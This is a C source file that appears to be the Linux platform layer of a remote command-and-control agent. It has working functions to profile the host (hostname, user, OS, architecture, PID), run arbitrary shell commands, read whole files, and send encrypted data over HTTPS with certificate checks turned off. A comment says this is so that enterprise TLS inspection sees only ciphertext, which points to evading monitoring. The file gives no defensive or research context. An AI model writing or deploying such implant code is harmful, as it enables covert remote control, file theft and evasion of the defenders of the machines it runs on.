#define _GNU_SOURCE
#include "port.h"

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netdb.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/ssl.h>
#include <pwd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

int sys_init(void) { return 0; }
void sys_shutdown(void) {}
void sys_free(void *p) { free(p); }

void rand_bytes(unsigned char *out, size_t n) {
    if (RAND_bytes(out, (int)n) != 1) exit(1);
}

int sha256(const unsigned char *in, size_t n, unsigned char out[32]) {
    return EVP_Digest(in, n, out, NULL, EVP_sha256(), NULL) == 1 ? 0 : -1;
}

int aes_gcm_seal(const unsigned char key[32], const unsigned char nonce[12],
                 const unsigned char *pt, size_t pt_len,
                 unsigned char *ct, size_t ct_len, unsigned char tag[16]) {
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    int outl = 0, ok = 0;
    if (!ctx || ct_len < pt_len) goto done;
    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL) != 1) goto done;
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, 12, NULL) != 1) goto done;
    if (EVP_EncryptInit_ex(ctx, NULL, NULL, key, nonce) != 1) goto done;
    if (EVP_EncryptUpdate(ctx, ct, &outl, pt, (int)pt_len) != 1) goto done;
    if (EVP_EncryptFinal_ex(ctx, ct + pt_len, &outl) != 1) goto done;
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, 16, tag) != 1) goto done;
    ok = 1;
done:
    EVP_CIPHER_CTX_free(ctx);
    return ok ? 0 : -1;
}

int aes_gcm_open(const unsigned char key[32], const unsigned char nonce[12],
                 const unsigned char *ct, size_t ct_len, const unsigned char tag[16],
                 unsigned char *pt, size_t pt_len) {
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    int outl = 0, ok = 0;
    if (!ctx || pt_len < ct_len) goto done;
    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL) != 1) goto done;
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, 12, NULL) != 1) goto done;
    if (EVP_DecryptInit_ex(ctx, NULL, NULL, key, nonce) != 1) goto done;
    if (EVP_DecryptUpdate(ctx, pt, &outl, ct, (int)ct_len) != 1) goto done;
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, 16, (void *)tag) != 1) goto done;
    if (EVP_DecryptFinal_ex(ctx, pt + ct_len, &outl) != 1) goto done; /* tag mismatch fails here */
    ok = 1;
done:
    EVP_CIPHER_CTX_free(ctx);
    return ok ? 0 : -1;
}

uint64_t now_unix(void) { return (uint64_t)time(NULL); }

void sleep_sec(double s) {
    struct timespec ts;
    ts.tv_sec = (time_t)s;
    ts.tv_nsec = (long)((s - (double)ts.tv_sec) * 1e9);
    if (ts.tv_nsec < 0) ts.tv_nsec = 0;
    nanosleep(&ts, NULL);
}

static int parse_url(const char *url, char *host, size_t host_sz, int *port, char *path, size_t path_sz) {
    const char *p, *slash, *colon;
    size_t hl;
    if (strncmp(url, "https://", 8) != 0) return -1;
    p = url + 8;
    slash = strchr(p, '/');
    colon = strchr(p, ':');
    if (colon && (!slash || colon < slash)) {
        hl = (size_t)(colon - p);
        *port = atoi(colon + 1);
    } else {
        hl = slash ? (size_t)(slash - p) : strlen(p);
        *port = 443;
    }
    if (hl == 0 || hl >= host_sz) return -1;
    memcpy(host, p, hl);
    host[hl] = '\0';
    snprintf(path, path_sz, "%s", slash ? slash : "/");
    return 0;
}

static int has_substring(const unsigned char *hay, size_t n, const char *needle) {
    size_t nl = strlen(needle);
    size_t i;
    if (n < nl) return 0;
    for (i = 0; i + nl <= n; i++) {
        if (memcmp(hay + i, needle, nl) == 0) return 1;
    }
    return 0;
}

int http_post(const char *url, const char *ua, const char *body, size_t body_len,
              long *status_code, char **resp, size_t *resp_len) {
    char host[256], path[512], portstr[8], hosthdr[280];
    struct addrinfo hints, *res = NULL, *ai;
    int port = 443, sock = -1, ret = -1, n;
    SSL_CTX *ctx = NULL;
    SSL *ssl = NULL;
    char *buf = NULL, *out = NULL;
    size_t cap = 8192, len = 0, head = 0, blen = 0, clen = 0;
    int have_clen = 0;

    if (parse_url(url, host, sizeof host, &port, path, sizeof path) != 0) return -1;
    snprintf(portstr, sizeof portstr, "%d", port);
    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo(host, portstr, &hints, &res) != 0) return -1;
    for (ai = res; ai; ai = ai->ai_next) {
        sock = socket(ai->ai_family, ai->ai_socktype, ai->ai_protocol);
        if (sock < 0) continue;
        if (connect(sock, ai->ai_addr, ai->ai_addrlen) == 0) break;
        close(sock);
        sock = -1;
    }
    freeaddrinfo(res);
    if (sock < 0) return -1;

    ctx = SSL_CTX_new(TLS_client_method());
    if (!ctx) goto done;
    /* Cert validation is intentionally off: the AEAD key authenticates the
       server and enterprise TLS inspection only yields ciphertext. */
    SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);
    SSL_CTX_set_min_proto_version(ctx, TLS1_2_VERSION);
    ssl = SSL_new(ctx);
    if (!ssl) goto done;
    {
        static const unsigned char alpn[] = {8, 'h', 't', 't', 'p', '/', '1', '.', '1'};
        SSL_set_alpn_protos(ssl, alpn, sizeof alpn);
    }
    SSL_set_fd(ssl, sock);
    if (SSL_connect(ssl) != 1) goto done;

    if (port == 443) snprintf(hosthdr, sizeof hosthdr, "%s", host);
    else snprintf(hosthdr, sizeof hosthdr, "%s:%d", host, port);
    {
        size_t req_cap = strlen(path) + strlen(hosthdr) + strlen(ua) + body_len + 256;
        char *req = (char *)malloc(req_cap);
        if (!req) goto done;
        n = snprintf(req, req_cap,
                     "POST %s HTTP/1.1\r\n"
                     "Host: %s\r\n"
                     "User-Agent: %s\r\n"
                     "Accept: application/json\r\n"
                     "Accept-Language: en-US,en\r\n"
                     "Content-Type: application/json\r\n"
                     "Content-Length: %zu\r\n"
                     "Connection: close\r\n"
                     "\r\n",
                     path, hosthdr, ua, body_len);
        if (SSL_write(ssl, req, n) != n) { free(req); goto done; }
        free(req);
    }
    if (SSL_write(ssl, body, (int)body_len) != (int)body_len) goto done;

    buf = (char *)malloc(cap);
    if (!buf) goto done;
    for (;;) {
        int r;
        if (len + 4096 > cap) {
            cap *= 2;
            buf = (char *)realloc(buf, cap);
            if (!buf) goto done;
        }
        r = SSL_read(ssl, buf + len, (int)(cap - len));
        if (r <= 0) break;
        len += (size_t)r;
    }
    if (len < 15 || strncmp(buf, "HTTP/1.", 7) != 0) goto done;
    *status_code = strtol(buf + 9, NULL, 10);

    /* header/body split */
    for (head = 0; head + 3 < len; head++) {
        if (buf[head] == '\r' && buf[head + 1] == '\n' && buf[head + 2] == '\r' && buf[head + 3] == '\n') break;
    }
    if (head + 3 >= len) goto done;
    head += 4;

    /* honor Content-Length when present, else read-to-EOF semantics */
    {
        const char *h = buf, *hend = buf + head - 4;
        while (h < hend) {
            const char *eol = (const char *)memchr(h, '\n', (size_t)(hend - h));
            if (!eol) break;
            if (strncasecmp(h, "Content-Length:", 15) == 0) {
                clen = (size_t)strtoul(h + 15, NULL, 10);
                have_clen = 1;
            }
            h = eol + 1;
        }
    }
    if (have_clen) blen = clen <= len - head ? clen : len - head;
    else blen = len - head;
    if (blen > RESP_MAX_BODY) blen = RESP_MAX_BODY;

    out = (char *)malloc(blen ? blen : 1);
    if (!out) goto done;
    memcpy(out, buf + head, blen);
    *resp = out;
    *resp_len = blen;
    ret = 0;
done:
    if (ret != 0) free(out);
    free(buf);
    if (ssl) { SSL_shutdown(ssl); SSL_free(ssl); }
    if (ctx) SSL_CTX_free(ctx);
    if (sock >= 0) close(sock);
    return ret;
}

static int run_shell(const char *cmd, unsigned char **out, size_t *out_len, int *exit_code) {
    FILE *f = popen(cmd, "r");
    size_t cap = 8192, len = 0;
    unsigned char *buf;
    int rc;
    if (!f) return -1;
    buf = (unsigned char *)malloc(cap);
    if (!buf) { pclose(f); return -1; }
    for (;;) {
        size_t r;
        if (len == cap) {
            if (cap >= (size_t)OUT_CAP + 1) break;
            cap *= 2;
            if (cap > (size_t)OUT_CAP + 1) cap = (size_t)OUT_CAP + 1;
            buf = (unsigned char *)realloc(buf, cap);
            if (!buf) break;
        }
        r = fread(buf + len, 1, cap - len, f);
        len += r;
        if (r == 0 || len >= (size_t)OUT_CAP) break;
    }
    rc = pclose(f);
    if (WIFEXITED(rc)) *exit_code = WEXITSTATUS(rc);
    else if (WIFSIGNALED(rc)) *exit_code = 128 + WTERMSIG(rc);
    else *exit_code = -1;
    *out = buf;
    *out_len = len;
    return 0;
}

int exec_cmd(const char *cmd, int timeout_sec, unsigned char **out, size_t *out_len, int *exit_code) {
    char *full = (char *)malloc(strlen(cmd) + 64);
    if (!full) return -1;
    if (timeout_sec <= 0 || timeout_sec > 600) timeout_sec = 30;
    sprintf(full, "timeout %d %s 2>&1", timeout_sec, cmd);
    if (run_shell(full, out, out_len, exit_code) != 0) {
        free(full);
        return -1;
    }
    if (*exit_code == 127 && has_substring(*out, *out_len, "not found") &&
        has_substring(*out, *out_len, "timeout")) {
        /* no coreutils timeout(1) on this box — run without the wrapper */
        free(*out);
        *out = NULL;
        *out_len = 0;
        sprintf(full, "%s 2>&1", cmd);
        run_shell(full, out, out_len, exit_code);
    }
    free(full);
    return 0;
}

int read_file_bytes(const char *path, unsigned char **out, size_t *out_len, int *err_code) {
    struct stat st;
    size_t total = 0;
    unsigned char *buf;
    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        *err_code = errno == ENOENT ? 1 : 2;
        *out = (unsigned char *)malloc(1);
        *out_len = 0;
        return 0;
    }
    if (fstat(fd, &st) != 0 || S_ISDIR(st.st_mode)) {
        close(fd);
        *err_code = 1;
        *out = (unsigned char *)malloc(1);
        *out_len = 0;
        return 0;
    }
    if (st.st_size > FILE_CAP) {
        close(fd);
        *err_code = 3;
        *out = (unsigned char *)malloc(1);
        *out_len = 0;
        return 0;
    }
    buf = (unsigned char *)malloc((size_t)st.st_size > 0 ? (size_t)st.st_size : 1);
    if (!buf) { close(fd); *err_code = 2; *out = (unsigned char *)malloc(1); *out_len = 0; return 0; }
    while (total < (size_t)st.st_size) {
        ssize_t r = read(fd, buf + total, (size_t)st.st_size - total);
        if (r <= 0) break;
        total += (size_t)r;
    }
    close(fd);
    *out = buf;
    *out_len = total;
    *err_code = 0;
    return 0;
}

void host_info(char *hostname, size_t hn, char *username, size_t un,
               char *os, size_t on, char *arch, size_t an, uint32_t *pid) {
    struct utsname u;
    gethostname(hostname, hn - 1);
    hostname[hn - 1] = '\0';
    {
        struct passwd *pw = getpwuid(geteuid());
        if (pw && pw->pw_name) snprintf(username, un, "%s", pw->pw_name);
        else {
            const char *e = getenv("USER");
            snprintf(username, un, "%s", e ? e : "");
        }
    }
    if (uname(&u) == 0) {
        snprintf(os, on, "%s %s", u.sysname, u.release);
        if (strcmp(u.machine, "x86_64") == 0) snprintf(arch, an, "amd64");
        else if (strcmp(u.machine, "aarch64") == 0) snprintf(arch, an, "arm64");
        else snprintf(arch, an, "%s", u.machine);
    } else {
        snprintf(os, on, "Linux");
        snprintf(arch, an, "amd64");
    }
    *pid = (uint32_t)getpid();
}
